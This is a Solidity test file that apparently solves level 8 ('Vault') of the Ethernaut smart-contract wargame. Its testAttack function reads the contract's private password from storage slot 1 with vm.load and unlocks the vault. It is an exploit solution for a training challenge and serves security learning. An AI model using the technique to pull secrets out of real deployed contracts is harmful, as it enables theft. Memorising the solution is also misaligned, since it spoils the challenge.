// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/8_Vault.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_8_VAULT_ADDRESS, 0);

        // Additional setup
    }

    function testAttack() public validateInstance {
        Vault vault = Vault(levelInstance);
        
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(password);
    }
}